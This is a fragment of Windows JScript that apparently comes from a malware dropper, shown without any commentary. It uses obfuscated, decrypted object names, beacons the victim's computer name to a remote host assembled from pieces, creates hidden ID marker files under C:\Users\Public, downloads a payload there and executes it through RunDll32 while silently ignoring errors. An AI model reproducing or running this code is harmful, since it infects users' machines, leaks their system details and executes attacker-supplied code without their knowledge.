            if (WinHttpReq.Status == 404)
            {
                return false;
            }
            data = WinHttpReq.ResponseBody;
        }
        catch (ex)
        {
            //WScript.Echo("Error downloading file: " + ex.message);
            return false;
        }

        ado = new ActiveXObject("ADODB.Stream");
        ado.Type = 1; // binary mode
        ado.Open();
        ado.Write(data);
        ado.SaveToFile(file, 2); // 2 = overwrite existing file
        ado.Close();

        return true;
    }


function down6160(url, file) {
var data;
        var ado;

        try
        {
            var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
   
            // ResolveTimeout, ConnectTimeout, SendTimeout, ReceiveTimeout
            WinHttpReq.SetTimeouts(30000, 30000, 30000, 5000);
   
            void(WinHttpReq.Open("GET", url, false));
            WinHttpReq.Send();
            if (WinHttpReq.Status == 404)
            {
                return false;
            }
            data = WinHttpReq.ResponseBody;
        }
        catch (ex)
        {
            //WScript.Echo("Error downloading file: " + ex.message);
            return false;
        }

        ado = new ActiveXObject("ADODB.Stream");
        ado.Type = 1; // binary mode
        ado.Open();
        ado.Write(data);
        ado.SaveToFile(file, 2); // 2 = overwrite existing file
        ado.Close();

        return true;
    }




var network = new ActiveXObject(wdecrypt4195(cWN3t,xID));
sNomeMaq = network.computerName;                                                                                   
cFolder = cFolder + sNomeMaq.substring(0, 3) + "EDXO866\\";
sId = cFolder + "id";                                                                                              
sIdW = cFolder + "idw";                                                                                            
cHosttotal = cHost582+cHost891+cHost125+cHost102+cHost234+cHost043;
c1nf3ctz = c1nf3ctz +"?tmpString=" + cHosttotal + "&pcn=" + network.computerName+ "&AT=" + 0106;

var fso = WScript.CreateObject(wdecrypt4195(cScrF1l3,xID));                                                      
	if (!fso.FileExists(sId) && fso.FolderExists("C:\\Users\\Public\\")){                                      
 try{                                                                                                              
    down6160(c1nf3ctz)} catch(err) {}                            
		if (!fso.FolderExists(cFolder)) {                                                                              
fso.CreateFolder(cFolder);
		}                                                                                                              

	if (fso.FolderExists("C:\\Program Files (x86)\\")) {                                                             
	sTipoSO = "64";                                                                                                  
	} else {                                                                                                         
	sTipoSO = "32";                                                                                                  
	}                                                                                                               
	var s = fso.CreateTextFile(sId, true);                                                                           
   	s.WriteLine(wdecrypt4195(cID,xID));                                                                                 
   	s.Close();                                                                                                         
	var s2 = fso.CreateTextFile(sIdW, true);                                                                           
   	s2.WriteLine("91");                                                                                
   	s2.Close();                                                                                                         
 try{                                                                                                              
    down6160(cHosttotal)} catch(err) {}                            
	down6160(cHosttotal, "C:\\Users\\Public\\"+ NAMEWM049);  
try 
{run2916("RunDll32.exe C:\\Users\\Public\\"+ NAMEAT526 + ",imane");
}catch(err) {} 
        }  
